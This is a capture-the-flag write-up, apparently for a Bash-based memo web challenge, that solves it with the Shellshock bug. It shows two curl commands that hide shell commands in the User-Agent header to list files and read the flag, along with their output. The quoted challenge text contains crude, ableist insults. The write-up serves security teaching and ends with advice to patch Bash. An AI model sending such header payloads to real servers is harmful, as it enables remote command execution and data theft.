# GuessTheNumber

## Problem

"How did I end up here?" is the only question you can think of since you've become a high school teacher. Let's face it, you hate children. Bunch of egocentric retards. Anyway, you are not going to take it anymore. It's time to have your little midlife crisis right in the face of these fuckers.

Good thing that you're in the middle of some project days and these little dipshits wrote a simple message storing web application. How cute. It's written in bash... that's... that's... aw- no... bashful. You've got the source, you've got the skills. 0wn the shit out of this and show them who's b0ss.

[Challenge](https://school.fluxfingers.net:1503/) (up as of 25 Oct, 2015)

[Source](bashful.tar.bz2)

## Solution

Credit: [@emedvedev](https://github.com/emedvedev)

**Note**: we'll be taking a shortcut not originally intended by the challenge developers, so if you'd like to know how to properly exploit a website written in bash (no, grandson, we don't normally do that here in 2015, don't be frightened), find another write-up.

The site in question is a memo service: it gives you a `sessid` and lets you write memos while escaping all the special chars. There's also a `DEBUG` parameter, a vulnerability allowing you to mess with environment variables, and the `sessid` itself could be exploited, too, so there's probably a million ways to solve it. Well, disregard all that: it's written in Bash, so why try hard when you have [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug))?

```
$ curl -H "User-Agent: () { :; }; /bin/ls" https://school.fluxfingers.net:1503/
404.sh
flag
home.html
home.sh
index.sh

$ curl -H "User-Agent: () { :; }; /bin/cat flag" https://school.fluxfingers.net:1503/
flag{as_classic_as_it_could_be}
```

Done.

Again, that was not an intended solution, but there's still something to learn here: even if you're as security-conscious as most CTF organizers, eventually there _will_ be an attack vector you neglected, more often than not a stupidly simple one. Pay attention to the little things, be vigilant and go patch your Bash. Right now.
